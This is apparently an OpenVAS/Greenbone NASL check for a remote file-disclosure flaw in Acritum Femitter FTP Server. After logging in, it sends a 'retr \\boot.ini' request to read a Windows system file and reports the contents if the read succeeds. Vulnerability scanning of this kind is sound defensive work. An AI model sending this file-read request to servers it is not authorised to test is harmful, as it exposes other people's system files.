# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100165");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2009-04-26 20:59:36 +0200 (Sun, 26 Apr 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Acritum Femitter Server Remote File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("Host/runs_windows", "ftp/femitter_ftp/detected");

  script_tag(name:"summary", value:"Acritum Femitter FTP Server is prone to a remote file-disclosure
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view local files in
  the context of the server process.This may aid in further attacks.");

  script_tag(name:"affected", value:"Acritum Femitter Server 0.96 and 1.03 are affected. Other versions
  may be vulnerable as well.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34689");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(! banner || "Femitter FTP Server ready." >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2)
    {
      send(socket:soc1, data:'retr \\boot.ini\r\n');
      result = ftp_recv_data(socket:soc2);
      close(soc2);
    }
  }

  if(result && egrep(pattern: "\[boot loader\]", string: result)) {
    info = string("Here are the contents of the file 'boot.ini' that the scanner was able to read from the remote host:\n\n");
    info += result;
    info += string("\n");

    security_message(port:ftpPort,data:info);
    ftp_close(socket:soc1);
    close(soc1);
    exit(0);
  }

  ftp_close(socket:soc1);
  close(soc1);
  exit(0);
}

exit(0);
